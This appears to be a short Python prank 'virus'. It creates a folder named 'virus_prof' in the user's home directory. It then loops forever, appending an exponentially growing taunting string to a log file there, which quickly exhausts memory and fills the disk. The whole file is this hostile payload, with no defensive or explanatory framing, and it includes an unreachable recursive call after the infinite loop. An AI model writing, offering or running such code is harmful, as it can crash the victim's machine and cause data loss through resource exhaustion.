import os
import pathlib

def main():
    main_path = pathlib.Path.home() / "virus_prof"
    log_path = main_path / "log.txt"

    # Create the directory if it doesn't exist
    main_path.mkdir(exist_ok=True)

    # Create/append to a file that endlessly loops
    prank_str = "hahahahaha get pranked idiot. \n"
    while True:
        with open(log_path, 'a') as f:
            for _ in range(23):
                prank_str += prank_str
            f.write(prank_str)
    
    main()

if __name__ == "__main__":
    main()